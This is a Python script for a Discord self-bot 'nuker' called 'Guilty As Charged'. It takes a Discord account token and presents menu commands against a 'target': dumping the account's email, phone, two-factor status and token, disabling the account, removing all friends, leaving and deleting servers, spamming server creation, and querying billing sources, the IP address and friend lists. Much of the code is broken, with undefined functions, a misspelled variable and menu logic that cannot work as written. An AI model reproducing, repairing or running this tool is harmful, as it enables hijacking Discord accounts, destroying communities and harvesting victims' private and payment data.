import discord
import time
import pyfiglet
from pyfiglet import Figlet
import requests
from discord.ext import commands
from discord.ext.commands import Bot
import urllib
import urllib.request
from colorama import Fore
def network_test(host='https://www.google.com'):
    print("Testing...")
    time.sleep(1.9)
    try:
        urllib.request.urlopen(host)
        return True
        print("Network Connection Found and Active")
    except:
        return False
        print(f"{Fore.RED}No Network Connection Found!{Fore.RESET}")
        input("Press any key to exit...")

custom_fig = Figlet(font='graffiti')
print(custom_fig.renderText(f'{Fore.RED}Guilty As Charged{Fore.RESET}'))
token = input(f"{Fore.RED}Token : {Fore.RESET}")
head = {'Authorization': str(token)}
src = requests.get('https://discord.com/api/v6/users/@me', headers=head)
bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")
if src.status_code == 200:
    print('[+] Account valid ')
else:
    print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
    input(f"{Fore.RED}Press any key to exit...{Fore.RESET}")
    exit(0)
@bot.command
async def getUserInfo_withToken(token):
    print("Working...")
    time.sleep(2.3)
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        password = r.json()['password']
        mfa = r.json()['mfa_enabled']
        print(f"""
        [{Fore.RED}User ID{Fore.RESET}]         {userID}
        [{Fore.RED}User Name{Fore.RESET}]       {userName}
        [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
        [{Fore.RED}Email{Fore.RESET}]           {email}
        [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
        [{Fore.RED}Token{Fore.RESET}]           {token}
    """)
@bot.command
async def spamTargetServer():
    print("Working...")
    time.sleep(2.3)
    for i in range(times):
        await bot.create_guild('Ya got hacked mate.', region=None, icon=None)
@bot.command
async def delFriends():
    print("Working...")
    time.sleep(2.3)
    for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"can't unfriend {user}")
@bot.command
async def DisableToken():
    print("Working...")
    time.sleep(2.3)
    d = requests.patch('https://discord.com/api/v6/users/@me', headers={'Authorization': token})
    if d.status_code == 400:
        print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
        input("Press any key to exit...")
    else:
        print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
        input("Press any key to exit...")
@bot.command       
async def server_Crash():
    print("Crashing...")
    time.sleep(2.3)
    for guild in bot.guilds:
        try:
            await guild.leave()
            print(f'left from [{guild.name}]')
        except:
            print(f'[{guild.name}] was not kicked due to an error. Try again later.')
    for guild in bot.guilds:
        try:
            await guild.delete()
            print(f'[{guild.name}] have been deleted')
        except:
            print(f'CANT delete [{guild.name}]')    


print("""
###################################
#              MENU               #
#                                 #
# 1. Network test                 #
# 2. Disable Token                #
# 3. Delete All TargetFriends     #
# 4. Get Private target Info      #
# 5. Spam Target                  #
# 6. Crash target discord servers #
# 7. NUKE                         #
#          EXTREME STUFF          #
# 1. Billing info                 #
# 2. Get IP                       #
# 3. Get list of all friends      #
###################################
""")
menuChoice = input(f"guilty(MENU){Fore.red}> {Fore.RESET}")
if menuChoice == 1:
    network_test()
if menuChoice == 2:
    DisableToken()
if menuChoice == 3:
    delFriend()
if menuChoice == 4: 
  getUserInfo_withToken()
if menuChoice == 5:
    spamTargetServer()
if menuChoice == 6:
    server_Crash()
if menuCoice == 7:
    DisableToken()
    delFriends()
    server_Crash()
    spamTargetServer()
    getUserInfo_withToken()
@bot.command
async def getip():
    ip = ""
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
@bot.command
async def get_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
@bot.command
async def getfriends(token):
    try:
        return loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
bot.run(token)
if menuChoice == "extreme":
    extremeChoice = input(f"guilty(EXTREME){Fore.red}>  {Fore.RESET}")
if extremeChoice == 1:
    get_payment_methods()
if extremeChoice == 3:
    getfriends()
